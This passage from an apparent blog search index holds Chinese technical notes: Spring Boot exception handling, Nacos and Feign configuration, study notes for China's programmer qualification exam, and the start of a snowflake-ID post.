ApiResponse.error(e.getMessage()); } /** * 拦截未知的运行时异常 */ @ExceptionHandler(RuntimeException.class) public ApiResponse handleRuntimeException(RuntimeException e, HttpServletRequest request) { String requestURI = request.getRequestURI(); log.error(\u0026#34;请求地址[ {} ],发生未知异常.\u0026#34;, requestURI, e); return ApiResponse.error(e.getMessage()); } /** * 系统异常 */ @ExceptionHandler(Exception.class) public ApiResponse handleException(Exception e, HttpServletRequest request) { String requestURI = request.getRequestURI(); log.error(\u0026#34;请求地址[ {} ],发生系统异常.\u0026#34;, requestURI, e); return ApiResponse.error(e.getMessage()); } } 日志配置 [跳转](#5. log4j2的配置文件)\n整合mybatis [跳转](# 3. 整合mybatis等初始化配置)\nSwagger集成 [Swagger](# Swagger集成)\nKnife4j\n3.使用nacos 使用springcloud的时候版本要和springboot版本兼容\nhttps://spring.io/projects/spring-cloud#overview\nhttps://blog.csdn.net/qq_38637558/article/details/114448690\nspringboot2.5.x 高版本整合nacos报错\n2022-11-18 18:50:20.449 ERROR 37996 \u0026mdash; [ main] o.s.b.SpringApplication : Application run failed\norg.springframework.beans.factory.BeanCreationException: Error creating bean with name \u0026lsquo;configurationPropertiesBeans\u0026rsquo; defined in class path resource [org/springframework/cloud/autoconfigure/ConfigurationPropertiesRebinderAutoConfiguration.class]: Post-processing of merged bean definition failed; nested exception is java.lang.IllegalStateException: Failed to introspect Class [org.springframework.cloud.context.properties.ConfigurationPropertiesBeans] from ClassLoader [sun.misc.Launcher$AppClassLoader@18b4aac2]\n参考链接\nhttps://github.com/alibaba/spring-cloud-alibaba/wiki/%E7%89%88%E6%9C%AC%E8%AF%B4%E6%98%8E\n安装nacos并启动\n1 startup.cmd -m standalone 项目配置nacos\n在父工程的pom文件中的\u0026lt;dependencyManagement\u0026gt;中引入SpringCloudAlibaba的依赖：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 \u0026lt;properties\u0026gt; \u0026lt;spring-boot.version\u0026gt;2.6.7\u0026lt;/spring-boot.version\u0026gt; \u0026lt;spring-cloud.version\u0026gt;2021.0.4\u0026lt;/spring-cloud.version\u0026gt; \u0026lt;spring-cloud-alibaba.version\u0026gt;2021.0.4.0\u0026lt;/spring-cloud-alibaba.version\u0026gt; \u0026lt;/properties\u0026gt; \u0026lt;!-- 依赖声明 --\u0026gt; \u0026lt;dependencyManagement\u0026gt; \u0026lt;dependencies\u0026gt; \u0026lt;!-- SpringBoot的依赖配置--\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-dependencies\u0026lt;/artifactId\u0026gt; \u0026lt;!--\u0026lt;version\u0026gt;2.5.14\u0026lt;/version\u0026gt;--\u0026gt; \u0026lt;version\u0026gt;${spring-boot.version}\u0026lt;/version\u0026gt; \u0026lt;type\u0026gt;pom\u0026lt;/type\u0026gt; \u0026lt;scope\u0026gt;import\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- springCloud --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.cloud\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-cloud-dependencies\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;${spring-cloud.version}\u0026lt;/version\u0026gt; \u0026lt;type\u0026gt;pom\u0026lt;/type\u0026gt; \u0026lt;scope\u0026gt;import\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!--nacos注册中心--\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba.cloud\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-cloud-alibaba-dependencies\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;${spring-cloud-alibaba.version}\u0026lt;/version\u0026gt; \u0026lt;type\u0026gt;pom\u0026lt;/type\u0026gt; \u0026lt;scope\u0026gt;import\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; \u0026lt;/dependencyManagement\u0026gt; 然后在各微服务的pom文件中引入nacos-discovery依赖：\n1 2 3 4 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba.cloud\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-cloud-starter-alibaba-nacos-discovery\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; 各微服务yml配置\n1 2 3 4 5 6 spring: cloud: nacos: server-addr: localhost:8848 application: name: lab-drive 注：如果不想使用nacos作为服务注册和发现的话，设置 spring.cloud.nacos.discovery.enabled 为false\n4.使用feign 添加pom依赖\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 \u0026lt;!--feign远程调用--\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.cloud\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-cloud-starter-openfeign\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!--httpClient的依赖 --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;io.github.openfeign\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;feign-httpclient\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!--防止出现找不到hostname的异常--\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.cloud\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-cloud-loadbalancer\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!--使用高版本的speingcloud之后，spring想要用loadBalancer替换掉ribbon,启动的时候会有警告--\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.github.ben-manes.caffeine\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;caffeine\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.8.8\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; https://blog.csdn.net/JGMa_TiMo/article/details/121971430\n配置yml\n1 2 3 4 5 6 7 8 9 10 #feign配置 feign: client: config: default: # default全局的配置 loggerLevel: BASIC # 日志级别，BASIC就是基本的请求和响应信息 httpclient: enabled: true # 开启feign对HttpClient的支持 max-connections: 200 # 最大的连接数 max-connections-per-route: 50 # 每个路径的最大连接数 添加@EnableFeignClients注解\n1 2 3 4 @Configuration @EnableFeignClients(basePackages = \u0026#34;org.opengms.admin.clients\u0026#34;) public class ApplicationConfig { } 编写client\n1 2 3 4 5 6 7 8 9 @FeignClient(\u0026#34;lab-container\u0026#34;) public interface ContainerClient { String CONTEXT_PATH = \u0026#34;/container\u0026#34;; @GetMapping(CONTEXT_PATH + \u0026#34;/container/list/image\u0026#34;) ApiResponse listImages(); } 不通过注册中心使用feign\n设置yml\n1 2 3 4 spring: cloud: discovery: enabled: false client\n1 2 3 4 5 6 7 8 9 @FeignClient(name = \u0026#34;lab-container\u0026#34;, url = \u0026#34;localhost:8810/container\u0026#34;) public interface ContainerClient { String CONTEXT_PATH = \u0026#34;\u0026#34;; @GetMapping(CONTEXT_PATH + \u0026#34;/container/list/image\u0026#34;) ApiResponse listImages(); } name：服务名称 （注：若使用注册中心，此处应该写生产者服务名称） url：生产者的url地址\n","permalink":"https://chance7bin.github.io/posts/note/springboot-%E9%A1%B9%E7%9B%AE%E6%90%AD%E5%BB%BA/","summary":"新建工程和确定工程目录 项目分的模块为： lab-admin项目核心模块 lab-common项目通用工具模块 1. 新建工程及多Module子工程 一、","title":"Springboot 项目搭建"},{"content":" 学习攻略\n真题\n真题，建议从 10 年开始做，10 - 15 年的真题练习用，16 - 18 年真题自己卡时间模拟考\n程序员考试重点汇总 计算机系统基础知识 进制之间的转化 ==表示符：八进制还可以用Q表示==\n==ASCII：美国信息交换标准代码。一般使用7位二进制数来表示字母、数字、标点符号及部分特殊控制字符。==\n十进制和其他进制之间的转换\n==除基取余法：从下往上==\n==乘基取整法：从上往下==\n==不足x位时，小数前在高位加0，小数后在末尾加0==\n==1024 = 2^10^==\n奇校验：整个校验码（有效信息位和校验位）中“1”的个数为奇数。\n偶校验：整个校验码（有效信息位和校验位）中“1”的个数为偶数。\n奇偶校验，可检查1位的错误，不可纠错。\n原、反、补、移码运算和逻辑运算 原码：将数据用二进制形式表示，最高位为符号位, 正数为 0, 负数为 1。\n反码：正数的反码是其本身；负数的反码是在其原码的基础上, 符号位不变，其余各位取反。\n补码：正数的补码是其本身；负数的补码是在其原码的基础上, 符号位不变, 在反码的基础上+1。\n移码：将补码的符号位取反得相应的移码。\n注意：==在补码和移码表示中，0 有唯一的编码，补码中+0 和-0 均为 0000 0000（八位二进制表示下）==。\n多数计算机都采用补码进行加减运算，其符号位和数值位一样参与运算，无须做特殊处理。\n在 n 位二进制表示下：\n原码、反码表示的数据范围为：-（2^n-1^-1）～+（2^n-1^-1）\n补码、移码表示的数据范围为：-2^n-1^～+（2^n-1^-1）\n==补码中，用 1000 0000 表示-128。==\n浮点数 两浮点数进行运算的过程\n运算过程：\n对阶 \u0026gt; 尾数计算 \u0026gt; 结果格式化\n对阶时，小数向大数看齐，对阶是通过==较小数的尾数右移（小数点左移）==实现的\n结果格式化 01、10开头（0.5~1之间）\n逻辑运算 校验码 1、奇偶校验码\n由若干位有效信息（如一个字节），再加上一个二进制位（校验位）组成校验码。\n奇校验：整个校验码（有效信息位和校验位）中“1”的个数为奇数。\n偶校验：整个校验码（有效信息位和校验位）中“1”的个数为偶数。\n奇偶校验，可检查 1 位的错误，不可纠错。\n==奇偶校验，可检查奇数位的错误，不可纠错。如果偶数位发生错误，则发现不了。==\n2、海明码\n在数据位之间插入 K 个校验位，通过扩大码距来实现检错和纠错。\n3、循环冗余校验码（n,k）码\n信息码占 k 位，校验码占 n-k 位，校验码位数越长，校验能力越强。采用了模二运算。\n计算机系统与中央处理器构成 CPU 指令执行过程（流水线技术）\n计算机每执行一条指令都可分为三个阶段：取指令—分析指令—执行指令。\n取指令：根据程序计数器 PC 中的值从程序存储器读出现行指令，送到指令寄存器 IR。\n分析指令：将指令寄存器中的指令操作码取出后进行译码，分析其指令性质。\n执行指令：控制、指挥、协调整个计算机系统的各个子系统, 相互配合、有条不紊的完成各项任务。\n执行程序的过程实际上就是逐条指令地重复上述操作过程，直至遇到停机指令可循环等待指令。\n运算器和控制器的组成\n运算器的构成：\ni. 算术逻辑单元 ALU：数据的算术运算和逻辑运算\nii. 累加寄存器 AC（数据寄存器）：通用寄存器，为 ALU 提供一个工作区，用在暂存数据\niii. 数据缓冲寄存器 DR：写内存时，暂存指令或数据\niv. 状态条件寄存器 PSW：存状态标志与控制标志 （争议：也有将其归为控制器的）\n控制器的构成：\ni. 程序计数器 PC：存储下一条要执行指令的地址\nii. 指令寄存器 IR：存储正在执行的指令\niii. 指令译码器 ID：对指令中的操作码字段进行分析解释\niv. 时序部件：提供时序控制信号\n指令寻址和存储器 指令系统\n立即寻址方式：操作数直接在指令中，速度快，灵活性差\n直接寻址方式：指令中存放的是操作数的地址\n间接寻址方式：指令中存放了一个地址，这个地址对应的内容是操作数的地址\n寄存器寻址方式：寄存器存放操作数\n寄存器间接寻址方式：寄存器内存放的是操作数的地址\n回收站：外存\n剪切板：内存\n容量的换算\n位（b/bit）：存放一位二进制数\n字节（B/Byte）：8 个二进制位为一个字节\n1B=8b\n1KB=1024B\n1MB=1024KB\n1GB=1024MB\n1TB=1024GB\n1PB=1024TB\n1EB=1024PB\n1ZB=1024EB\n1YB=1024ZB\n内存编址\n内存编址：存储器由一块块的空间（存储单元）组成，为了方便寻找到每一块空间，我们需要对每一个空间进行标识，即用地址（唯一的编号）来标识内存每个单元内存容量=每个芯片容量*芯片个数\n每个芯片的容量=一个地址代表的容量*编址总数\n总线系统 总线分类：芯片内总线、元件级总线、系统总线（ ISA 总线、EISA 总线、PCI 总线等）和外总线（RS-232C、SCSI 总线、USB、IEEE-1394 等）\n系统总线的分类：地址总线、数据总线和控制总线\n数据总线：决定 CPU 和外界的数据传送速度。每条传输线一次只能传输 1 位二进制数据。“64 位的CPU”是指 CPU 的数据总线的宽度是 64 位。字长取决于数据总线的宽度。 地址总线：CPU 是通过地址总线来指定存储单元的，其决定了 CPU 所能访问的最大内存空间的大小。例如: 若计算机的地址总线的宽度为 32 位，则最多允许直接访问 4GB 的物理空间，所以最多支持 4G内存。 控制总线：对外部器件进行控制，其宽度决定了 CPU 对外部器件的控制能力。 设有一个64K×32位的存储器(每个存储单元为32位)，其存储单元的地址宽度为64K=2^16^，总共16位。这里32位可以说是每个存储单元为32位，也可以理解为数据总线宽度是32。\n系统总线的性能指标：\n带宽：单位时间上传送的数据量，即每秒钟传送的最大稳态数据传输率\n位宽：能同时传送的二进制数据的位数，或数据总线的位数，32 位、64 位等\nCPU 与外设数据交换方式\nCPU 与外设之间进行交换数据的方式：\n立即程序传送方式：I/O 接口总是准备接收来自主机的数据或向主机输入数据，无需查看接口的状态\n程序查询方式：CPU 通过查询执行程序查询外设的状态进行判断是否准备好\n中断方式：I/O 接口准备好后会发送中断信号通知 CPU，CPU 确认后保存正在执行程序现场转而执行 I/O 中断服务程序\n直接存储器存取 DMA 方式：数据的传送由 DMA 控制器进行控制，不需要 CPU 的干涉，只能进行简单的数据传送操作\n通道控制方式：CPU 按约定格式准备数据和命令，然后启动通道，通道执行相应的通道程序完成所要求的操作\n计算机的性能指标\n计算机系统的主要性能指标：\n响应时间：从用户输入完整的操作命令到系统开始显示应答信息为止的这段时间\n吞吐量：单位时间内系统完成的工作量\n周转时间：用户提交作业到执行后该作业返回给用户所需的时间\n时钟频率：即 CPU 主频，直接反映了机器的速度，通常主频越高其速度越快，主频=外频×倍频\n平均运算速度：指每秒钟所能执行的指令条数，用“百万条指令／秒”（MIPS）来描述\n多媒体基础知识 声音信号数字化过程：采样、量化和编码\n图像分辨率：一幅图像的像素密度，每英寸多少点（dpi）表示图像大小 ；200dpi扫描一幅2x2.5英寸的照片，则可以得到400x500像素点的图像。\n像素深度：存储每个像素所用的二进制数，度量图像的色彩分辨率，图像深度为b位，则该图像最多的颜色数或灰度级为2^b^种\n无损压缩：利用数据的统计冗余进行压缩，可以保证在数据压缩和还原过程中，图像信息没有损耗或失真。（RAR、ZIP、TIFF、BMP、GIF等）\n有损压缩：用于重构信号不一定非要与原始信号完全相同的场合，压缩比高。主要包括：DVD、VCD、MP3 、JPEG、 MPEG 、RMVB、 WMA 、WMV等）\n媒体的种类 1) 多媒体的概念及分类\n传播信息的载体，如语言、文字、图像、视频、音频等；\n存贮信息的载体，如 ROM、RAM、磁带、磁盘、光盘等。\n多媒体的分类：\n感觉媒体：直接用于人的感觉器官，使人产生直接感觉的媒体\n表示媒体：传输感觉媒体的中介媒体，用于数据交换的编码\n表现媒体：进行信息输入输出的媒体\n存储媒体：用于存储表示媒体的物理介质\n传输媒体：传输表示媒体的物理介质\n交换媒体包括存储媒体和传输媒体。\n多媒体编辑软件\n硬件系统：多媒体主机、多媒体输入设备、多媒体输出设备、多媒体存储设备、多媒体板卡、多媒体操作控制设备\n软件系统：多媒体操作系统、多媒体创作工具软件、多媒体素材编辑软件、多媒体应用软件\n多媒体素材编辑软件：\n文本工具：WPS、Notebook（记事本）、Writer（写字板）、word 和 OCR\n图形/图像工具：Photoshop、Illustrator、PhotoDeluxe、PageMaker、Coredraw、AutoCAD、Freehand、3ds Max、Screen Thief等\n动画工具：GIF Construction Set、Xara 3D\n视频工具：Media Studio Pro、Premiere\n音频工具：CoolEditPro、GoldWave、Cake Walk Pro Audio\n播放工具：Media Player、ACDSee\n音频 声音信号的数字化过程\n采样（采样频率，与采样周期成反比）\n量化（量化精度(量化分辨率):样本用二进制表示,位数多少反映精度）\n编码（按照一定格式进行数据编码及组织成文件）\n常见音频文件格式\n（.wav）：微软公司发布的音频文件格式, Windows 系统使用的标准音频文件格式。记录音乐的模拟信号的采样数值。质量高，数据量大。\n（.mod）：乐谱和乐曲使用的各种音色样本\n（.mp3）：最流行的音频文件格式\n（.ra）：网络上的音频格式，流媒体技术，强大压缩比和极小失真\n（.mid）：非波形采样点音乐格式，工业标准，文件非常小\n（.voc）：Create 公司发布的波形音频文件格式\n（.snd）：数字声音文件格式，支持压缩\n（.aif）：APPLE 计算机上的音频格式\n（.au）：Unix 系统中的数字文件格式\n图形和图像 图形/图像区别\n图形：矢量表示，用数学的方式来描述一幅图，放大、缩小、扭曲等变换后不会损失画面细节。（用于线框型图画、工程制图和美术字等）\n图像：像素点表示，用若干二进制位来指定像素的颜色、亮度和属性。放大后会失真。存储空间大，需进行压缩。\n图形图像主要性能指标\n显示分辨率：显示屏上能够显示的像素数目，1024x768 表示显示屏分为 768 行（垂直分辨率），每行（水平分辨率）显示 1024 像素。\n图像分辨率：一幅图像的像素密度，**每英寸多少点（dpi）**表示图像大小 ；200dpi 扫描一幅 2x2.5 英寸的照片，则可以得到400x500 像素点的图像。\n像素深度：存储每个像素所用的二进制数，度量图像的色彩分辨率，图像深度为 b 位，则该图像最多的颜色数或灰度级为 2^b^ 种\n常见图像文件格式\n（.bmp）：windows 标准位图文件格式\n（.gif）：用于网络传输，数据块为单位传输信息，采用无损压缩算法\n（.tif）：扫描仪和桌面出版系统中较为普及\n（.pcx）：PC 画笔的图像文件格式\n（.png）：作为 GIF 替代品\n（.jpg）：有损压缩，压缩比例高，适合于处理大量图像的场合\n（.wmf）：只在 windows 中使用，保存函数调用信息\njpeg：静态图像压缩标准\n动画和视频 常见视频文件格式\n（.gif）：用于网络传输\n（.avi）：微软公司发布的视频文件格式（AVI 文件）\n（.mov/.qt）：Apple 公司发布的视频文件格式，较小存储空间，开放性（Quick Time 文件）\n（.rm/.rmvb）：Real Networks 公司格式，影像实时传输与播放（RealVideo 文件）\n（.mpeg/.mpg/.dat/.mp4）：运动图像压缩标准，压缩效率高，质量好，兼容性好\n（.fli/.foc）:Autodesk 公司出品答得彩色动画文件格式（Flic 文件）\n多媒体相关计算 有损\u0026amp;无损压缩格式\n无损压缩：利用数据的统计冗余进行压缩，可以保证在数据压缩和还原过程中，图像信息没有损耗或失真。（RAR、ZIP、TIFF、BMP、GIF 等）\n有损压缩：用于重构信号不一定非要与原始信号完全相同的场合，压缩比高。主要包括：DVD、VCD、MP3 、JPEG、 MPEG 、RMVB、 WMA 、WMV 等）\n操作系统 信号量S：整型变量，并根据控制对象进行赋值。S≧0表示资源可用数，S\u0026lt;0表示排队进程数。\n互斥模型：多进程共享一台打印机。\n同步模型：单缓冲区生产者、消费者问题；多缓冲区生产者、消费者问题\n操作系统概述 操作系统的基本概念\n操作系统：组织和管理软件、硬件资源以及计算机系统中的工作流程，并控制程序的执行，向用户提供接口。\n特征：并发性、共享性、虚拟性和不确定性。\n功能：进程管理、存储管理、文件管理、作业管理和设备管理。\n类型：批处理、分时、实时、网络、分布式、微机和嵌入式。\n操作系统的五大功能\n进程管理：进程控制、进程同步、进程通信、进程调度\n文件管理：文件存储空间管理、目录管理、文件的读写管理、存取控制\n存储管理：存储分配与回收、存储保护、地址映射（变换）、主存扩充\n设备管理：对硬件设备管理，对输入输出设备的分配、启动、完成和回收\n作业管理：任务、界面管理，人机交互、图形界面、语音控制、虚拟现实\n操作系统的分类\n批处理操作系统：单道批和多道批操作系统\n分时操作系统： 一个计算机系统与多个终端设备连接，特点：多路性、独立性、交互性和及时性\n实时操作系统：实时控制系统和实时信息系统，交互能力要求不高，可靠性要求高\n网络操作系统：方便有效共享网络资源，提供服务软件和有关协议的集合，主要的网络操作系统有：Unix、Linux 和 Windows Server 系统\n分布式操作系统：任意两台计算机可以通过通信交换信息，是网络操作系统的更高级形式，具有透明性、可靠性和高性能等特性\n微机操作系统：Windows：Microsoft 开发的图形用户界面、多任务、多线程操作系统和 Linux：免费使用和自由传播的类 Unix 操作系统，多用户、多任务、多线程和多 CPU 的操作系统\n嵌入式操作系统：运行在智能芯片环境中，特点：微型化、可定制、实时性、可靠性、易移植性\n操作系统能方便用户之间的交流（x） 正确答案是网络\n进程管理 进程三态模型\n三态模型：哪三种状态和状态之间的转换\n信号量机制\n进程通信：各个进程交换信息的过程。\n分类：同步（直接制约）、互斥（申请临界资源间接制约）。\n信号量 S：整型变量，并根据控制对象进行赋值。S≧0 表示资源可用数，S\u0026lt;0 表示排队进程数。\nn个资源m个进程：S的范围是 n-m ~ n\nn个进程，每个进程需要m个资源\n一定不会产生死锁：资源数 \u0026gt;= n * (m - 1) + 1\n一定会产生死锁：资源数 \u0026lt;= m - 1\n分类：公用信号量（互斥）、私用信号量（同步）\nPV 机制、互斥和同步\n互斥模型：多进程共享一台打印机。\n同步模型：单缓冲区生产者、消费者问题；多缓冲区生产者、消费者问题\n在单缓冲区生产者消费模型中：s1、s2 是同步信号量，s1 的初值为 1，s2 的初值为 0。\n如果是多缓冲区生产者消费者问题，则：s1、s2 是同步信号量，s1 的初值为 n，s2 的初值为 0（n 表示缓冲区可以容纳的产品数量）。\n存储管理 存储管理：目的是解决多个用户使用主存的问题。\n分类：分区存储管理、分页存储管理、分段存储管理、段页式存储管理以及虚拟存储管理。\n分页存储管理：用户程序的地址空间被划分成若干固定大小的区域，称为“页”，相应地，内存空间分成若干个物理块，页和块的大小相等。可将用户程序的任一页放在内存的任一块中，实现了离散分配。\n分段存储管理：将用户程序地址空间分成若干个大小不等的段，每段可以定义一组相对完整的逻辑信息。存储分配时，以段为单位，段与段在内存中可以不相邻接，也实现了离散分配。作业的地址空间被划分为若干个段，每个段定义了一组逻辑信息。段的长度由相应的逻辑信息组的长度决定，因而各段长度不等。\n段页式存储管理：用分段方法来分配和管理虚拟存储器。程序的地址空间按逻辑单位分成基本独立的段，而每一段有自己的段名，再把每段分成固定大小的若干页。\n(2) 用分页方法来分配和管理实存。把整个主存分成与上述页大小相等的存储块，可装入作业的任何一页。程序对内存的调入或调出是按页进行的。\n相对地址/虚地址/逻辑地址：在目标程序中，程序指令和数据的位置按照字或字节单位根据它们的相对顺序来确定，称为相对地址，一般从O开始依次进行编号。\n相对地址空间通过地址再定位机构转换到绝对地址空间(物理地址空间)。\n虚拟存储管理\n虚拟存储器：利用外部辅存暂存主存待加载的数据，组成主存+辅存的虚拟存储结构。\n虚拟存储器的最大容量是由计算机系统的地址结构和外存空间决定的。\n采用虚拟存储器的目的是扩大用户的地址空间。\n局限性：时间局限性、空间局限性。\n实现方式：请求分页系统、请求分段系统、请求段页式系统。\n页面置换算法\n页面置换算法：最佳置换算法、先进先出置换算法、最近最少未使用置换算法、最近未用置换算法。\n先根据所采用的方式确定淘汰的页面，然后再淘汰掉这个页面，再把缺的页面置换进去即可。\n逻辑地址都是页号+页内地址\n设备管理 CPU 与外设之间进行交换数据的方式：\n直接程序控制：\n1）立即程序传送方式：I/O 接口总是准备接收来自主机的数据或向主机输入数据，无需查看接口的状态；\n2）程序查询方式：CPU 通过查询执行程序查询外设的状态进行判断是否准备好，I/O 设备不主动反馈信息；\n中断方式：I/O 接口准备好后会发送中断信号通知 CPU，CPU 确认后保存正在执行程序现场转而执行 I/O 中断服务程序；\n直接存储器存取 DMA 方式：数据的传送由 DMA 控制器进行控制，不需要 CPU 的干涉，只能进行简单的数据传送操作；\n通道控制方式：CPU 按约定格式准备数据和命令，然后启动通道，通道执行相应的通道程序完成所要求的操作。\n磁盘调度\n磁盘调度：采用适当的调度算法，使各进程对磁盘的平均访问时间最小。硬/磁盘的主要技术指标：道密度、位密度、存储容量、平均存取时间、寻道时间、等待时间、数据传输率。\n数据读取时间：通常由磁道搜索、扇区搜索、数据传输三个部分组成。\n驱动调度：先来先服务、最短寻道时间优先、扫描算法、单向扫描调度算法。\n磁盘调度算法\n先来先服务算法：该算法实际上不考虑访问者要求访问的物理位置，而只是考虑访问者提出访问请求的先后次序。有可能随时改变移动臂的方向。\n最短寻找时间优先调度算法：从等待的访问者中挑选寻找时间最短的那个请求执行，而不管访问者的先后次序。这也有可能随时改变移动臂的方向。\n电梯调度算法：从移动臂当前位置沿移动方向选择最近的那个柱面的访问者来执行，若该方向上无请求访问时，就改变臂的移动方向再选择。\n单向扫描调度算法：不考虑访问者等待的先后次序，总是从 0 号柱面开始向里道扫描，按照各自所要访问的柱面位置的次序去选择访问者。在移动臂到达最后一个柱面后，立即快速返回到 0 号柱面，返回时不为任何的访问者提供服务，在返回到 0 号柱面后，再次进行扫描。\n文件管理 文件结构\n文件：具有符号名的、在逻辑上具有完整意义的一组相关信息项的集合。\n目录结构：一级目录结构、二级目录结构、三级目录结构\n文件路径\n绝对路径：从根目录开始的路径（如：C:\\username\\desktop\\document\\ABC.docx）\n相对路径：从用户当前工作目录下开始的路径 （如：document\\ABC.docx）\n文件命名要求\n文件夹命名规则：\n1）最大长度为 255 个字符\n2）允许使用英文字母，数字。￥ @ \u0026amp; +（ ）、下划线、空格、汉字，不允许使用？ \\ * \u0026lt; \u0026gt; ： / | ”\n3）在操作系统中搜索时可以用 * 匹配 0 个或多个字符，用 ? 匹配任何一个字符\n文件管理\n建立文件夹结构：建立适合自己的文件夹结构，注意控制文件夹结构的级数和每个文件夹中文件的个数（级数不要超过 5 级，每个文件夹的个数控制在 100 以内）\n文件和文件夹命名：规范的对文件夹和文件命名方便查看和检索\n数据备份 backup：对关键数据定期及时的备份，以免数据被毁造成重大损失\n文件类型\n文件类型和文件后缀名的对应关系\n系统的安全\n系统的安全：\n系统级：主要任务是不允许未经核准的用户进入系统，主要措施有：注册和登录\n用户级：对所有用户分类和对指定用户分配访问权，设置不同的存储权限分为超级用户、系统操作员和一般用户\n目录级：保护系统中的各种目录而设计的\n文件级：通过系统管理员或文件主对文件属性的设置来控制用户对文件的访问用户对文件的访问，包含：用户访问权、目录访问权限及文件属性权限\n用户权限管理\nwindows 中系统对用户的默认权限情况：\nAdministrators：管理员组，用户对计算机/域有不受限制的完全访问权。\nPower Users：高级用户组可以执行除了为 Administrators 组保留的任务外的其他任何操作系统任务。\nUsers：普通用户组，这个组的用户无法进行有意或无意的改动。\nEveryone：所有的用户，这个计算机上的所有用户都属于这个组。\nGuests：来宾组，来宾组跟普通组 Users 的成员有同等访问权，但来宾账户的限制更多。\n作业管理 正在执行的作业是进程。\n作业调度：先来先服务、短作业优先、响应比高优先、优先级调度、均衡调度。\n用户界面\n用户界面（ User interface ）：计算机中实现用户与计算通信的软件、硬件部分总称，也称之为用户接口或人机界面。\n用户界面设计原则：简易性、用户的语言、记忆负担最小化、一致性、利用用户的熟悉程度、从用户的观点考虑（最关键的判断点）、排列分组、安全性、人性化\n程序设计语言 程序设计语言及其构成 表达式 中缀转后缀：运算顺序保持不变\n后缀表达式运算过程：通过==栈==：先取出来放后面，后取出来放前面\n传值和传址调用 语言处理程序 编译程序 有限自动机和正规式 数据结构和算法知识 栈是只能在一端进行插入和删除操作的线性表，其中允许插入和删除的一端叫做栈顶，另一端叫做栈底。栈是一种后进先出（LIFO）的数据结构，先入栈的元素要比后入栈的元素后出栈。故将一串数据全部入栈后再全部出栈，数据的次序将前后颠倒。栈主要应用于函数调用或中断调用过程中。\n队列是一种先进先出（FIFO）的数据结构，先入队列的元素要先于后入队列的元素出队列。故一串数据无论以何种操作次序通过队列，其次序都不会发生变化。\n如果对一棵有n个结点的完全二叉树的结点按层序编号则对任一结点i（1≤i≤n），有： ①如果i=1，则结点i无父结点，是二叉树的根；如果i\u0026gt;1，则父结点是$\\lfloor i/2 \\rfloor$； ② 如果2i\u0026gt;n，则结点i为叶子结点，无左子结点；否则，其左子结点是结点2i； ③ 如果2i+1\u0026gt;n，则结点i无右子叶点，否则，其右子结点是结点2i+1。 向下取整\n顺序表和链表 线性结构和非线性结构的区别\n数组 字符串 矩阵 栈和队列 树 树的基本性质 如果对一棵有n个结点的完全二叉树的结点按层序编号则对任一结点i（1≤i≤n），有： ①如果i=1，则结点i无父结点，是二叉树的根；如果i\u0026gt;1，则父结点是$\\lfloor i/2 \\rfloor$； ② 如果2i\u0026gt;n，则结点i为叶子结点，无左子结点；否则，其左子结点是结点2i； ③ 如果2i+1\u0026gt;n，则结点i无右子叶点，否则，其右子结点是结点2i+1。 向下取整\n树的遍历 特殊二叉树 找最小两个树，先写在图上，然后把两数相加的结果放到待选择列表，并删除这两个数（第一次：删除10、20，添加30）\n图 算法特性和复杂度 查找 排序 软件工程知识点 软件工程概述 软件需求分析 软件设计 软件测试 软件运行与维护 程序员职业素养 面向对象基础知识 面向对象基本概念 UML 设计模式 数据库知识点 数据库基本概念 数据流图 概念模型 关系模型 关系运算 SQL语言 数据库控制 网络基础知识点 网络概述 OSI和TCPIP IP地址与子网划分 浏览器 URL和电子邮件 网络安全 知识产权 其他 文件类型 Excel常考函数 ","permalink":"https://chance7bin.github.io/posts/note/%E8%BD%AF%E8%80%83-%E7%A8%8B%E5%BA%8F%E5%91%98/","summary":"学习攻略 真题 真题，建议从 10 年开始做，10 - 15 年的真题练习用，16 - 18 年真题自己卡时间模拟考 程序员考试重点汇总 计算机系统基础知识 进制之间的转化","title":"软考 程序员"},{"content":" 参考链接：\n快速了解雪花算法详解及spring boot集成\nSpringBoot快速开发（六）【雪花算法（snowflake）自增ID】\n1.介绍 